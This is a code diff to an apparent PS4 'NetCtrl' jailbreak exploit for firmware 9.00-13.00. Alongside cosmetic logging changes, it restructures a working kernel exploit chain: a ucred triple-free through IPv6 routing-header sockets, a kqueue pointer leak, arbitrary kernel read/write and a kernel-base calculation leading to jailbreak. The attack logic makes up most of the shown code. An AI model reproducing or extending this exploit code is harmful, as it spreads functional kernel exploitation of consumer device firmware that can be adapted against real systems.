@@ -618,10 +618,10 @@ function wait_uio_writev () {
 }
 
 function init () {
-  debug('=== PS4 NetCtrl Jailbreak ===')
+  log('=== PS4 NetCtrl Jailbreak ===')
 
   FW_VERSION = get_fwversion()
-  debug('Detected PS4 firmware: ' + FW_VERSION)
+  log('Detected PS4 firmware: ' + FW_VERSION)
 
   if (FW_VERSION === null) {
     log('Failed to detect PS4 firmware version.\nAborting...')
@@ -640,13 +640,13 @@ function init () {
   }
 
   if (compare_version(FW_VERSION, '9.00') < 0 || compare_version(FW_VERSION, '13.00') > 0) {
-    debug('Unsupported PS4 firmware\nSupported: 9.00-13.00\nAborting...')
+    log('Unsupported PS4 firmware\nSupported: 9.00-13.00\nAborting...')
     send_notification('Unsupported PS4 firmware\nAborting...')
     return false
   }
 
   kernel_offset = get_kernel_offset(FW_VERSION)
-  debug('Kernel offsets loaded for FW ' + FW_VERSION)
+  log('Kernel offsets loaded for FW ' + FW_VERSION)
 
   return true
 }
@@ -833,13 +833,13 @@ function find_twins () {
       if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
         twins[0] = i
         twins[1] = j
-        debug('[*] Twins found: [' + i + '] [' + j + ']')
+        log('Twins found: [' + i + '] [' + j + ']')
         return true
       }
     }
     count++
   }
-  debug('find_twins failed')
+  log('find_twins failed')
   return false
   // cleanup();
   // throw new Error("find_twins failed");
@@ -904,37 +904,121 @@ function init_threading () {
   saved_mxcsr = Number(read32(jmpbuf.add(0x44)))
 }
 
+const LOG_MAX_LINES = 38
+const LOG_COLORS = [
+  '#FF6B6B', '#FFA94D', '#FFD93D', '#6BCF7F',
+  '#4DABF7', '#9775FA', '#DA77F2'
+]
+
+function setup_log_screen () {
+  jsmaf.root.children.length = 0
+
+  const bg = new Image({
+    url: 'file:///../download0/img/multiview_bg_VAF.png',
+    x: 0, y: 0, width: 1920, height: 1080
+  })
+  jsmaf.root.children.push(bg)
+
+  for (let i = 0; i < LOG_COLORS.length; i++) {
+    new Style({ name: 'log' + i, color: LOG_COLORS[i], size: 20 })
+  }
+
+  const logLines: any[] = []
+  const logBuf: string[] = []
+
+  for (let i = 0; i < LOG_MAX_LINES; i++) {
+    const line = new jsmaf.Text()
+    line.text = ''
+    line.style = 'log' + (i % LOG_COLORS.length)
+    line.x = 20
+    line.y = 120 + i * 20
+    jsmaf.root.children.push(line)
+    logLines.push(line)
+  }
+
+  _log = function (msg: string, screen: boolean) {
+    if (screen) {
+      logBuf.push(msg)
+      if (logBuf.length > LOG_MAX_LINES) logBuf.shift()
+      for (let i = 0; i < LOG_MAX_LINES; i++) {
+        logLines[i].text = i < logBuf.length ? logBuf[i] : ''
+      }
+    }
+    ws.broadcast(msg)
+  }
+}
+
+function yield_to_render (callback: () => void) {
+  const id = jsmaf.setInterval(function () {
+    jsmaf.clearInterval(id)
+    try {
+      callback()
+    } catch (e: any) {
+      log('ERROR: ' + e.message)
+      cleanup()
+    }
+  }, 0)
+}
+
+let exploit_count = 0
+let exploit_end = false
+
 function netctrl_exploit () {
+  setup_log_screen()
+
   const supported_fw = init()
   if (!supported_fw) {
     return
   }
 
+  log('Setting up exploit...')
+  yield_to_render(exploit_phase_setup)
+}
+
+function exploit_phase_setup () {
   setup()
+  log('Workers spawned')
+  exploit_count = 0
+  exploit_end = false
+  yield_to_render(exploit_phase_trigger)
+}
 
-  let end = false
-  let count = 0
-
-  while (!end && count < MAIN_LOOP_ITERATIONS) {
-    count++
-    // Trigger vulnerability.
-    if (!trigger_ucred_triplefree()) {
-      continue
-    }
-
-    // Leak pointers from kqueue.
-    end = leak_kqueue()
-  }
-  if (count === MAIN_LOOP_ITERATIONS && !end) {
-    debug('Failed to adquiere slow kernel R/W')
+function exploit_phase_trigger () {
+  if (exploit_count >= MAIN_LOOP_ITERATIONS) {
+    log('Failed to acquire kernel R/W')
     cleanup()
-    throw new Error('Netctrl failed - Reboot and try again')
+    return
   }
 
-  // Time to create arbitrary R/W
-  setup_arbitrary_rw()
+  exploit_count++
+  log('Triggering vulnerability (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')...')
 
-  // Jailbreak
+  if (!trigger_ucred_triplefree()) {
+    yield_to_render(exploit_phase_trigger)
+    return
+  }
+
+  log('Leaking kqueue...')
+  yield_to_render(exploit_phase_leak)
+}
+
+function exploit_phase_leak () {
+  if (!leak_kqueue()) {
+    yield_to_render(exploit_phase_trigger)
+    return
+  }
+
+  log('Setting up arbitrary R/W...')
+  yield_to_render(exploit_phase_rw)
+}
+
+function exploit_phase_rw () {
+  setup_arbitrary_rw()
+  log('Jailbreaking...')
+  yield_to_render(exploit_phase_jailbreak)
+}
+
+function exploit_phase_jailbreak () {
   jailbreak()
 }
 
@@ -988,7 +1072,7 @@ function setup_arbitrary_rw () {
     debug('Reading master_r_pipe_data[' + i + '] : ' + hex(readed))
   }
 
-  debug('[+] Arbitrary R/W achieved.')
+  log('Arbitrary R/W achieved')
 
   debug('Reading value in victim_r_pipe_file: ' + hex(kread64(victim_r_pipe_file)))
 }
@@ -1029,11 +1113,11 @@ function jailbreak () {
 
   // Calculate kernel base
   kernel.addr.base = kl_lock.sub((kernel_offset as { KL_LOCK: number }).KL_LOCK)
-  debug('Kernel base: ' + hex(kernel.addr.base))
+  log('Kernel base: ' + hex(kernel.addr.base))
 
   jailbreak_shared(FW_VERSION)
 
-  debug('Jailbreak Complete - JAILBROKEN')
+  log('Jailbreak Complete - JAILBROKEN')
   utils.notify('The Vue-after-Free team congratulates you\nNetCtrl Finished OK\nEnjoy freedom')
 }
 
@@ -1223,7 +1307,7 @@ function trigger_ucred_triplefree () {
       continue
     }
 
-    debug('Triple freeing...')
+    log('Triple freeing...')
 
     // Free one.
     free_rthdr(ipv6_socks[twins[1]])
@@ -1266,7 +1350,7 @@ function trigger_ucred_triplefree () {
 
     // If error start again to better exploit possibility
     if (triplets[1] === -1) {
-      debug("Couldn't find triplet 1")
+      log("Couldn't find triplet 1")
       // Clean up and start again
       // Release iov spray.
       // if we break on 'read32(leak_rthdr) == 1', we never released workers
@@ -1286,7 +1370,7 @@ function trigger_ucred_triplefree () {
 
     // If error start again to better exploit possibility
     if (triplets[2] === -1) {
-      debug("Couldn't find triplet 2")
+      log("Couldn't find triplet 2")
       // Clean up and start again
       close(new BigInt(uaf_socket))
       // Start again
@@ -1300,7 +1384,7 @@ function trigger_ucred_triplefree () {
   }
 
   if (main_count === TRIPLEFREE_ITERATIONS) {
-    debug('Failed to Triple Free')
+    log('Failed to Triple Free')
     return false
   }
   return true
@@ -1336,7 +1420,7 @@ function leak_kqueue () {
   }
   if (count === KQUEUE_ITERATIONS) {
     // Dropped out with no kqueue leak
-    debug('Failed to leak kquede_fdp')
+    log('Failed to leak kqueue_fdp')
     return false
   }
 
@@ -1346,7 +1430,7 @@ function leak_kqueue () {
   kq_fdp = read64(leak_rthdr.add(0x98))
 
   if (kq_fdp.eq(0)) {
-    debug('Failed to leak kqueue_fdp')
+    log('Failed to leak kqueue_fdp')
     return false
   }
 
